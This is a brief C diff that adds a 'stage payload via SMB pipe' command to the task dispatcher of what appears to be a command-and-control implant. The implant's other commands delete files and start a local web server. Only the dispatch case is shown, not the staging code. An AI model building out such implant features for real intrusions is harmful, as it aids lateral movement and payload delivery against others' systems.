@@ -88,6 +88,9 @@ void TaskDispatch(int cmd, char* buffer, int size)
 		case COMMAND_FILE_RM:
 			FilesystemRemove(buffer, size);
 			break;
+		case COMMAND_STAGE_PAYLOAD_SMB:
+			StagePayloadViaPipe(buffer, size);
+			break;
 		case COMMAND_WEBSERVER_LOCAL:
 			WebServerLocal(buffer, size);
 			break;
